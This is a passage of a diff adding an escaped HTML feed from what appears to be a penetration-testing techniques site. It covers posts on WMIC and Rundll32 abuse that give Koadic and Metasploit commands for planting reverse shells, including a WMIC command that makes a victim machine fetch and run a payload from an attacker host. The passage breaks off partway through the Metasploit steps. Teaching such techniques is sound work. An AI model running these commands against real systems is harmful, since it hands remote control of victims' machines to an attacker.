+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ git clone &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;https://github.com/zerosum0x0/koadic.git&lt;span class=&#34;o&#34;&gt;](&lt;/span&gt;https://github.com/zerosum0x0/koadic.git&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 2: Move to the kodic directory &amp;amp; install the dependencies&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-2-move-to-the-kodic-directory--install-the-dependencies&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-2-move-to-the-kodic-directory--install-the-dependencies&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; koadic
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ pip3 install -r requirements.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 3: Run kodic &amp;amp; Generate the XLS file&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-3-run-kodic--generate-the-xls-file&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-3-run-kodic--generate-the-xls-file&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ use stager/js/wmic
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; SRVHOST &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Attacker IP&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ run&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 4: Download the payload from the victims device through WIMC command.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-4-download-the-payload-from-the-victims-device-through-wimc-command&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-4-download-the-payload-from-the-victims-device-through-wimc-command&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ wmic os get /FORMAT:&lt;span class=&#34;s2&#34;&gt;&amp;#34;[http://10.0.2.4:9996/payload.xls](http://10.0.2.4:9996/payload.xls)”&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 5: From the attackers console, you can see the infected zombie&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-5-from-the-attackers-console-you-can-see-the-infected-zombie&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-5-from-the-attackers-console-you-can-see-the-infected-zombie&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ zombies &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261122001534.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>[04] DLL</title>
+      <link>http://localhost:1313/docs/03_techniques/04-dll/</link>
+      <pubDate>Mon, 26 Oct 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/03_techniques/04-dll/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;October 26, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;What is a DLL ?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;what-is-a-dll-&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#what-is-a-dll-&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;DLL is known as Dynamic Link Library which provides most of the operating systems functionality. Lets, understand it in a simpler way. If you want to use a new font in notepad you should have the new font installed in your computer, similarly when any program runs in a windows computer it needs the supporting libraries to function properly which in this case is DLL files. You might have experienced errors such as DLL file missing, which we call it as a dependency issue, this happens when the required library file is not available for a process to run.&lt;/p&gt;
+&lt;h4&gt;What is a RunDLL32 ?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;what-is-a-rundll32-&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#what-is-a-rundll32-&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Run Time DLL loads the required libraries during a runtime rather than importing all the DLL’s while a program is starting. Rundll32 is a 32 bit runtime DLL that can be loaded while a program is running, this is convenient for an attacker since they will be able to inject a malicious library function to obtain a reverse shell.&lt;/p&gt;
+&lt;h4&gt;Reverse shell using Rundll32:&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;reverse-shell-using-rundll32&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#reverse-shell-using-rundll32&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Given that we will be able to load malicious libraries into the victims device, an attacker will be able to obtain a reverse shell using various methods, we will explore a couple methods in this scenario,&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Koadic Framework&lt;/li&gt;
+&lt;li&gt;Metasploit Framework&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Reverse shell using Koadic Framework:&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;reverse-shell-using-koadic-framework&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#reverse-shell-using-koadic-framework&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Make sure that you have koadic framework installed into your penetration testing distribution.&lt;/p&gt;
+&lt;h5&gt;STEP 1: Move into the Koadic framework folder &amp;amp; Run koadic&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-1-move-into-the-koadic-framework-folder--run-koadic&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-1-move-into-the-koadic-framework-folder--run-koadic&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ./koadic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 2: Choose the Rundll32 stager from the framework&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-2-choose-the-rundll32-stager-from-the-framework&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-2-choose-the-rundll32-stager-from-the-framework&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ use stager/js/rundll32_js
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; SRVHOST &amp;lt;Attacker_IP&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ run&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 3: Call the malicious java script produced by the koadic framework from the victims device.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-3-call-the-malicious-java-script-produced-by-the-koadic-framework-from-the-victims-device&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-3-call-the-malicious-java-script-produced-by-the-koadic-framework-from-the-victims-device&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ Malicious Script produced by Kodiac Framework&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261122002301.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h5&gt;STEP 4: Interact with the infected host from the console&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-4-interact-with-the-infected-host-from-the-console&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-4-interact-with-the-infected-host-from-the-console&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ zombies &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4&gt;Reverse shell using Metasploit Framework:&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;reverse-shell-using-metasploit-framework&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#reverse-shell-using-metasploit-framework&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h5&gt;STEP 1: Run the metasploit framework console and use smb_delivery module&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-1-run-the-metasploit-framework-console-and-use-smb_delivery-module&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-1-run-the-metasploit-framework-console-and-use-smb_delivery-module&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ use exploit/windows/smb/smb_delivery
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ options
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; SRVHOST 10.0.2.4
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ run&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261122002233.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h5&gt;STEP 2: Copy the command produced by metasploit and run it in the victims device.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-2-copy-the-command-produced-by-metasploit-and-run-it-in-the-victims-device&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-2-copy-the-command-produced-by-metasploit-and-run-it-in-the-victims-device&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
